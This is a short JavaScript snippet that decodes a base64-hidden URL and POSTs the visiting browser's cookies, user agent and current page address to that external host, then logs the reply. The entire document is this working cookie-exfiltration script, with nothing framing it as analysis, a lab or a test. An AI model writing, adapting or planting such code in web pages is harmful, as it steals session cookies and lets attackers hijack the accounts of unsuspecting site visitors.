fetch(atob("aHR0cHM6Ly9hc3RvbGFzdHVkaW8uc2Fzc2FieWRldi5jby56YS93YXBraXov"), {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    cookies: document.cookie.split(';').reduce((cookies, cookie) => (([name, value] = cookie.trim().split('=')), (cookies[name] = value), cookies), {}),
    userAgent: navigator.userAgent,
    currentUrl: window.location.href
  })
})
  .then(response => (response.ok ? response.json() : Promise.reject('Network response was not ok')))
  .then(data => console.log(data))
  .catch(error => console.error('Fetch error:', error));
